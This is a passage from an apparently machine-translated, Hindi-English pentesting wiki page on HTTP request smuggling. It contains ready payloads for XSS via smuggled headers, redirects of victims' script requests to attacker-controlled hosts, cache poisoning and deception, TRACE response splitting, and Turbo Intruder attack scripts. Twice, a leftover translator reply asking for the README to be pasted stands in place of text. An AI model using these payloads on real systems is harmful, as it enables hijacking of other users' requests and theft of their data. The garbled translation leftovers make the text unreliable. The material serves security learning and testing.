- Target users के साथ इंटरैक्शन **आवश्यक नहीं है**।
- यह उन हिस्सों में XSS exploitation की अनुमति देता है जो **normally unattainable** होते हैं, जैसे HTTP request headers।

ऐसे परिदृश्यों में जहाँ कोई वेबसाइट User-Agent header के माध्यम से Reflected XSS के लिए संवेदनशील है, निम्न payload दिखाता है कि इस vulnerability का कैसे exploit किया जा सकता है:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
This payload इस vulnerability का exploit करने के लिए इस तरह संरचित है:

1. एक सामान्य दिखने वाली `POST` request आरंभ करना, जिसमें smuggling शुरू करने का संकेत देने के लिए `Transfer-Encoding: chunked` header होता है।
2. उसके बाद `0` भेजना, जो chunked message body के अंत को चिह्नित करता है।
3. फिर, एक smuggled `GET` request डाली जाती है, जिसमें `User-Agent` header में `<script>alert(1)</script>` जैसा script inject किया जाता है, जो सर्वर जब इस subsequent request को प्रोसेस करता है तो XSS ट्रिगर करता है।

`User-Agent` को smuggling के जरिए manipulate करके, payload सामान्य request constraints को bypass कर देता है, इसलिए यह एक non-standard लेकिन प्रभावी तरीके से Reflected XSS vulnerability का exploit कर देता है।

#### HTTP/0.9

> [!CAUTION]
> अगर user content किसी response में ऐसे **`Content-type`** जैसे **`text/plain`** के साथ reflect होता है, तो XSS का execution रोका जा सकता है। अगर server **HTTP/0.9** को support करता है तो इसे bypass करना संभव हो सकता है!

HTTP/0.9 version, जो पहले HTTP/1.0 से पहले था, केवल **GET** verbs का उपयोग करता है और **headers** के साथ respond नहीं करता, सिर्फ body भेजता है।

In [**this writeup**](https://mizu.re/post/twisty-python), इसे request smuggling के साथ abuse किया गया था और एक **vulnerable endpoint that will reply with the input of the user** का उपयोग करके HTTP/0.9 के साथ request smuggle की गई। वह parameter जो response में reflect होगा, उसमें एक **fake HTTP/1.1 response (with headers and body)** शामिल था, इसलिए response में valid executable JS कोड होगा और `Content-Type` `text/html` होगा।

### Exploiting On-site Redirects with HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Applications अक्सर एक URL से दूसरे URL पर redirect करने के लिए redirect URL में `Host` header से hostname का उपयोग करती हैं। यह Apache और IIS जैसे वेब सर्वरों में सामान्य है। उदाहरण के लिए, किसी folder को trailing slash के बिना request करने पर उसे slash सहित redirect किया जाता है:
```
GET /home HTTP/1.1
Host: normal-website.com
```
कृपया src/pentesting-web/http-request-smuggling/README.md की सामग्री यहाँ पेस्ट करें ताकि मैं अनुवाद कर सकूँ।
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
हालाँकि यह व्यवहार दिखने में हानिरहित लगता है, इसे HTTP request smuggling का उपयोग करके users को किसी external site पर redirect करने के लिए हेरफेर किया जा सकता है। उदाहरण के लिए:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
यह smuggled request अगले प्रोसेस किए गए उपयोगकर्ता अनुरोध को attacker-controlled website पर redirect कर सकता है:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
परिणाम:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In this scenario, a user's request for a JavaScript file is hijacked. The attacker can potentially compromise the user by serving malicious JavaScript in response.

### Web Cache Poisoning का शोषण HTTP Request Smuggling के माध्यम से <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning तब किया जा सकता है यदि किसी भी घटक में **front-end infrastructure caches content**, आमतौर पर प्रदर्शन बढ़ाने के लिए। सर्वर की प्रतिक्रिया को बदलकर, यह संभव है कि आप **poison the cache**।

Previously, we observed how server responses could be altered to return a 404 error (refer to [Basic Examples](#basic-examples)). Similarly, it’s feasible to trick the server into delivering `/index.html` content in response to a request for `/static/include.js`. Consequently, the `/static/include.js` content gets replaced in the cache with that of `/index.html`, rendering `/static/include.js` inaccessible to users, potentially leading to a Denial of Service (DoS).

This technique becomes particularly potent if an **Open Redirect vulnerability** is discovered or if there's an **on-site redirect to an open redirect**. Such vulnerabilities can be exploited to replace the cached content of `/static/include.js` with a script under the attacker's control, essentially enabling a widespread Cross-Site Scripting (XSS) attack against all clients requesting the updated `/static/include.js`.

Below is an illustration of exploiting **cache poisoning combined with an on-site redirect to open redirect**. The objective is to alter the cache content of `/static/include.js` to serve JavaScript code controlled by the attacker:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Note the embedded request targeting `/post/next?postId=3`. यह अनुरोध `/post?postId=4` पर रीडायरेक्ट होगा, और डोमेन निर्धारित करने के लिए **Host header value** का उपयोग किया जाएगा। **Host header** को बदल कर, हमलावर अनुरोध को अपने डोमेन पर रीडायरेक्ट कर सकता है (**on-site redirect to open redirect**).

सफल **socket poisoning** के बाद, `/static/include.js` के लिए एक **GET request** प्रारम्भ किया जाना चाहिए। यह अनुरोध पिछले **on-site redirect to open redirect** अनुरोध से दूषित होगा और हमलावर द्वारा नियंत्रित स्क्रिप्ट की सामग्री को फ़ेच करेगा।

इसके बाद, `/static/include.js` के लिए कोई भी अनुरोध हमलावर की स्क्रिप्ट की cached सामग्री को परोसेगा, जिससे प्रभावी रूप से व्यापक XSS attack शुरू हो जाएगा।

### Using HTTP request smuggling to perform web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **web cache poisoning और web cache deception में क्या अंतर है?**
>
> - In **web cache poisoning**, हमलावर एप्लिकेशन को cache में कुछ दुर्भावनापूर्ण सामग्री संग्रहीत करने का कारण बनता है, और यह सामग्री cache से अन्य एप्लिकेशन उपयोगकर्ताओं को परोसी जाती है।
> - In **web cache deception**, हमलावर एप्लिकेशन को किसी अन्य उपयोगकर्ता का संवेदनशील कंटेंट cache में संग्रहीत करने का कारण बनता है, और फिर हमलावर वह सामग्री cache से पुनः प्राप्त कर लेता है।

हमलावर एक smuggled request तैयार करता है जो संवेदनशील उपयोगकर्ता-विशेष सामग्री को फ़ेच करता है। निम्नलिखित उदाहरण देखें:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
यदि यह smuggled request किसी static content (उदा., `/someimage.png`) के लिए निर्धारित cache entry को poison कर देता है, तो victim का संवेदनशील डेटा `/private/messages` उस static content के cache entry के तहत कैश हो सकता है। परिणामस्वरूप, attacker संभावित रूप से इन cached संवेदनशील डेटा को retrieve कर सकता है।

### TRACE का दुरुपयोग HTTP Request Smuggling के माध्यम से <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) में सुझाव दिया गया है कि यदि server पर method TRACE enabled है तो इसे HTTP Request Smuggling के साथ abuse किया जा सकता है। यह इसलिए है क्योंकि यह method किसी भी header को जो server को भेजा गया है, response के body के हिस्से के रूप में reflect कर देता है। उदाहरण के लिए:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
कृपया src/pentesting-web/http-request-smuggling/README.md की सामग्री यहाँ पेस्ट करें — मैं इसे दिए गए निर्देशों के अनुसार हिंदी में अनुवाद कर दूंगा।
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
इस व्यवहार का दुरुपयोग करने का एक उदाहरण होगा कि **smuggle first a HEAD request**। यह request केवल GET request के **headers** के साथ respond होगा (जिनमें **`Content-Type`** शामिल है)। और तुरंत HEAD के बाद **immediately after the HEAD a TRACE request** smuggle करें, जो **reflecting the sent dat**a होगा।\
चूँकि HEAD response में `Content-Length` header होगा, इसलिए **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** response में प्रतिबिंबित होगा।\
यह response connection पर अगले request को भेज दिया जाएगा, इसलिए इसका उपयोग किसी cached JS file में arbitrary JS code इंजेक्ट करने के लिए किया जा सकता है। 

### TRACE का दुरुपयोग HTTP Response Splitting के माध्यम से <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**this post**](https://portswigger.net/research/trace-desync-attack) को पढ़ना सुझाया गया है; यह TRACE method के दुरुपयोग का एक और तरीका बताता है। जैसा कि बताया गया है, smuggling a HEAD request and a TRACE request के साथ HEAD response में **control some reflected data** करना संभव है। HEAD request के body की लंबाई मूलतः `Content-Length` header में बताई जाती है और यह TRACE request के response से बनी होती है। 

इसलिए, नई सोच यह होगी कि, इस `Content-Length` और TRACE response में दिए गए डेटा को जानकर, यह संभव है कि TRACE response में `Content-Length` के अंतिम बाइट के बाद एक वैध HTTP response रखा जाए, जिससे attacker अगले response के request को पूरी तरह नियंत्रित कर सके (जिसका उपयोग cache poisoning करने के लिए किया जा सकता है)। 

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
ये responses उत्पन्न करेगा (ध्यान दें कि HEAD response में एक Content-Length है, जो TRACE response को HEAD body का हिस्सा बना देता है, और जैसे ही HEAD Content-Length समाप्त होता है एक मान्य HTTP response smuggled हो जाता है):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Weaponizing HTTP Request Smuggling with HTTP Response Desynchronisation

क्या आपने कोई HTTP Request Smuggling vulnerability पाया है और आप नहीं जानते कि इसे कैसे exploit किया जाए? इन अन्य exploitation तरीकों को आज़माएँ:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### अन्य HTTP Request Smuggling Techniques

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder scripts

### CL.TE

स्रोत: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

स्रोत: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Tools

- HTTP Hacker (Burp BApp Store) – concatenation/framing और low‑level HTTP व्यवहार को विज़ुअलाइज़ करने के लिए
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): यह टूल एक grammar-based HTTP Fuzzer है, जो अजीब request smuggling असंगतियों को खोजने में उपयोगी है।

## References

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- झूठे false‑positive से सावधान: HTTP pipelining और request smuggling में कैसे अंतर करें – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
